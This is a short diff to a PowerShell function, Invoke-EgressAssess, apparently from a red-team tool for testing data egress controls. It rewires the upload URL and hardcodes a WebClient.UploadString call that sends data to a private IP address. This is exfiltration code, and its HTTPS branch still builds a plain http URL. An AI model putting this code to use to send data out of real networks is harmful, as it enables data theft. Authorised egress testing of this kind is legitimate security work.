@@ -263,13 +263,11 @@ function Invoke-EgressAssess
                 }
                 if ($client -eq "http")
                 {
-                    #$Url = "http://" + $IP + "/post_data.php"
-                    $Url = "http://" + $IP
+                    $Url = "http://" + $IP + "/post_data.php"
                 }
                 elseif ($client -eq "https")
                 {
-                    #$Url = "https://" + $IP + "/post_data.php"
-                    $Url = "http://" + $IP
+                    $Url = "http://" + $IP + "/post_data.php"
                 }
                 #$uri = New-Object -TypeName System.Uri -ArgumentList $Url
                 $uri = New-Object -TypeName System.Uri($Url)
@@ -281,7 +279,7 @@ function Invoke-EgressAssess
                     $wc.proxy = $proxy
                 }
                 Write-Verbose  "Uploading  data..."
-                $wc.UploadString($Url, $Data)
+                $wc.UploadString("http://172.20.10.106/", $Data)
                 $totalupload += $sizedata
                 Write-Verbose "Transaction Complete!"
                 break
